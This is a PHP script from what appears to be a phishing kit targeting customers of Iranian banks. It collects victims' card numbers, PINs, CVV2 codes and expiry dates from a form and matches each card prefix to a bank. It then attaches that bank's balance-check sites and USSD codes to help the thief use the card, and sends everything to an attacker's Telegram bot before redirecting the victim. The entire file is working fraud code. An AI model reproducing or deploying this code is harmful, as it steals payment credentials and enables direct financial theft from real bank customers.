<?php
//created by @JavidH373
error_reporting(0);
if($_POST['cardnumber']){
$card=$_POST["cardnumber"];
			$ramz=$_POST["inputpin"];
			$cvv=$_POST["inputcvv2"];
			$mah=$_POST["inputmonth"];
			$sal=$_POST["inputyear"];



$cardnotspace = preg_replace('/\s+/', '',$card);


include "payment.php";

include "token.php";


				
if(preg_match('/603799/',$cardnotspace)){
		$esmebank = "melli";
		$helpmoj = "
Site: bale.apk
USSD: *717#  
TBank: 09622
Created By @JavidH373";}elseif(preg_match('/170019/',$cardnotspace)){
		$esmebank = "melli";
		$helpmoj = "
Site: bale.apk
USSD: *717#  
TBank: 09622
Created By @JavidH373";}elseif(preg_match('/589905/',$cardnotspace)){
		$esmebank = "melli";
		$helpmoj = "
Site: bale.apk
USSD: *717#  
TBank: 09622
Created By @JavidH373";}elseif(preg_match('/589210/',$cardnotspace)){
		$esmebank = "sepah";
		$helpmoj = "
Site: https://ib.ebanksepah.ir/desktop/sepahPages/shetabCard.sepah
USSD: ...  
TBank: 021 64058
Created By @JavidH373";}elseif(preg_match('/627648/',$cardnotspace)){
		$esmebank = "tosee_saderat";
		$helpmoj = "
Site: ...
USSD: ...  
TBank: 021 2722
Created By @JavidH373";}elseif(preg_match('/207177/',$cardnotspace)){
		$esmebank = "tosee_saderat";
		$helpmoj = "
Site: ...
USSD: ...  
TBank: 021 2722
Created By @JavidH373";}elseif(preg_match('/627961/',$cardnotspace)){
		$esmebank = "sanat madan";
		$helpmoj = "
Site: ...
USSD: *719#
TBank: 021 75024
Created By @JavidH373";}elseif(preg_match('/603770/',$cardnotspace)){
		$esmebank = "keshavarzi";
		$helpmoj = "
Site: https://ib.bki.ir/pid46.lmx
USSD: *730#
TBank: 09603
Created By @JavidH373";}elseif(preg_match('/639217/',$cardnotspace)){
		$esmebank = "keshavarzi";
		$helpmoj = "
Site: https://ib.bki.ir/pid46.lmx
USSD: *730#
TBank: 09603
Created By @JavidH373";}elseif(preg_match('/628023/',$cardnotspace)){
		$esmebank = "maskan";
		$helpmoj = "
Site: ...
USSD: *714# & *737#
TBank: 021 64096
Created By @JavidH373";}elseif(preg_match('/627760/',$cardnotspace)){
		$esmebank = "post bank iran";
		$helpmoj = "
Site: ...
USSD: *747#
TBank: 021 84284
Created By @JavidH373";}elseif(preg_match('/502908/',$cardnotspace)){
		$esmebank = "tosee taavon";
		$helpmoj = "
Site: https://epayment.ttbank.ir
USSD: ...
TBank: ...
Created By @JavidH373";}elseif(preg_match('/627412/',$cardnotspace)){
		$esmebank = "eghtsad novin";
		$helpmoj = "
Site: https://modern.enbank.net/CustomerManager/viewLogin.html
USSD: ...
TBank: 021 85292
Created By @JavidH373";}elseif(preg_match('/622106/',$cardnotspace)){
		$esmebank = "parsian";
		$helpmoj = "
Site:...
USSD: *708#
TBank: 021 89111
Created By @JavidH373";}elseif(preg_match('/639194/',$cardnotspace)){
		$esmebank = "parsian";
		$helpmoj = "
Site:...
USSD: *708#
TBank: 021 89111
Created By @JavidH373";}elseif(preg_match('/627884/',$cardnotspace)){
		$esmebank = "parsian";
		$helpmoj = "
Site:...
USSD: *708#
TBank: 021 89111
Created By @JavidH373";}elseif(preg_match('/502229/',$cardnotspace)){
		$esmebank = "pasargad";
		$helpmoj = "
Site: https://epay.bpi.ir/balanceinquiry.aspx
USSD: *720#
TBank: 021 828991111
Created By @JavidH373";}elseif(preg_match('/639347/',$cardnotspace)){
		$esmebank = "pasargad";
		$helpmoj = "
Site: https://epay.bpi.ir/balanceinquiry.aspx
USSD: *720#
TBank: 021 828991111
Created By @JavidH373";}elseif(preg_match('/627488/',$cardnotspace)){
		$esmebank = "kar afarin";
		$helpmoj = "
Site:...
USSD:...
TBank: 021 23640
Created By @JavidH373";}elseif(preg_match('/621986/',$cardnotspace)){
		$esmebank = "saman";
		$helpmoj = "
Site:...
USSD:*724#
TBank: 021 6422
Created By @JavidH373";}elseif(preg_match('/639346/',$cardnotspace)){
		$esmebank = "sina";
		$helpmoj = "
Site:https://sina24h.com/CustomerService2/viewLogin.html
USSD: *727#
TBank: 021 82487
Created By @JavidH373";}elseif(preg_match('/639607/',$cardnotspace)){
		$esmebank = "sarmaye";
		$helpmoj = "
Site:https://pg.sbank.ir/balanceRequest.do
USSD: ...
TBank: 021 8254
Created By @JavidH373";}elseif(preg_match('/636214/',$cardnotspace)){
		$esmebank = "ayande";
		$helpmoj = "
Site:...
USSD: *745#
TBank: 021 2957
Created By @JavidH373";}elseif(preg_match('/502806/',$cardnotspace)){
		$esmebank = "shahr";
		$helpmoj = "
Site:https://ebank.city-bank.net/customermanager/viewLogin.html
USSD: *787#
TBank: 021 87611
Created By @JavidH373";}elseif(preg_match('/504706/',$cardnotspace)){
		$esmebank = "shahr";
		$helpmoj = "
Site:https://ebank.city-bank.net/customermanager/viewLogin.html
USSD: *787#
TBank: 021 87611
Created By @JavidH373";}elseif(preg_match('/502938/',$cardnotspace)){
		$esmebank = "day";
		$helpmoj = "
Site: ...
USSD: ...
TBank: 021 2726
Created By @JavidH373";}elseif(preg_match('/603769/',$cardnotspace)){
		$esmebank = "saderat";
		$helpmoj = "
Site: ...
USSD: *719#
TBank: 09602
Created By @JavidH373";}elseif(preg_match('/610433/',$cardnotspace)){
		$esmebank = "mellat";
		$helpmoj = "
Site: ...
USSD: *720#
TBank: 021 8132
Created By @JavidH373";}elseif(preg_match('/991975/',$cardnotspace)){
		$esmebank = "mellat";
		$helpmoj = "
Site: ...
USSD: *720#
TBank: 021 8132
Created By @JavidH373";}elseif(preg_match('/627353/',$cardnotspace)){
		$esmebank = "tejarat";
		$helpmoj = "
Site: https://pg.tejaratbank.ir/paymentGateway/getBalance
USSD: ...
TBank: 021 81277
Created By @JavidH373";}elseif(preg_match('/585983/',$cardnotspace)){
		$esmebank = "tejarat";
		$helpmoj = "
Site: https://pg.tejaratbank.ir/paymentGateway/getBalance
USSD: ...
TBank: 021 81277
Created By @JavidH373";}elseif(preg_match('/589463/',$cardnotspace)){
		$esmebank = "refah";
		$helpmoj = "
Site:...
USSD: *729#
TBank: 021 84043000
Created By @JavidH373";}elseif(preg_match('/627381/',$cardnotspace)){
		$esmebank = "ansar";
		$helpmoj = "
Site:https://ebank.ansarbank.com/customermanager/viewLogin.html
USSD: *763#
TBank: 021 48049
Created By @JavidH373";}elseif(preg_match('/505785/',$cardnotspace)){
		$esmebank = "iran zamin";
		$helpmoj = "
Site:...
USSD: ...
TBank: 021 24760
Created By @JavidH373";}elseif(preg_match('/636795/',$cardnotspace)){
		$esmebank = "markazi";
		$helpmoj = "
Site:...
USSD: ...
TBank: ...
Created By @JavidH373";}elseif(preg_match('/636949/',$cardnotspace)){
		$esmebank = "hekmat";
		$helpmoj = "
Site:...
USSD: ...
TBank: 021 89555
Created By @JavidH373";}elseif(preg_match('/505416/',$cardnotspace)){
		$esmebank = "gardeshgary";
		$helpmoj = "
Site:https://epayment.tourism-bank.com/BalanceInquiry.aspx
USSD: *764#
TBank: 021 22630345
Created By @JavidH373";}elseif(preg_match('/606373/',$cardnotspace)){
		$esmebank = "qarzolhasane iran";
		$helpmoj = "
Site:https://epayment.rqb.ir/BalanceInquiry.aspx
USSD: ...
TBank: 021 8528
Created By @JavidH373";}elseif(preg_match('/628157/',$cardnotspace)){
		$esmebank = "moasse etebari tosee";
		$helpmoj = "
Site:...
USSD: ...
TBank: 021 81461
Created By @JavidH373";}elseif(preg_match('/505801/',$cardnotspace)){
		$esmebank = "kosar";
		$helpmoj = "
Site:...
USSD: *744#
TBank: 021 86777
Created By @JavidH373";}elseif(preg_match('/639370/',$cardnotspace)){
		$esmebank = "moasse mehr";
		$helpmoj = "
Site:https://modern.qmbi24.com/customermngr/viewLogin.html
USSD: ...
TBank: 021 8989
Created By @JavidH373";}elseif(preg_match('/639599/',$cardnotspace)){
		$esmebank = "qavamin";
		$helpmoj = "
Site: ...
USSD: ...
TBank: 021 84270
Created By @JavidH373";}else{
	
}

				


$textmsg =  "
NewCard

Name Bank: $esmebank

CardNumber : $cardnotspace

Ramz: $ramz

CVV2: $cvv

MAH: $mah SAL: $sal

Help: $helpmoj

@JavidH373

";
	
    $ok =  file_get_contents("https://api.telegram.org/bot".$token."/SendMessage?chat_id=".$groupid."&text=".urlencode($textmsg));

}else{
    echo "@JavidH373";
}

?>
<meta content='0;url=result.php<?php ?>' http-equiv='refresh'/>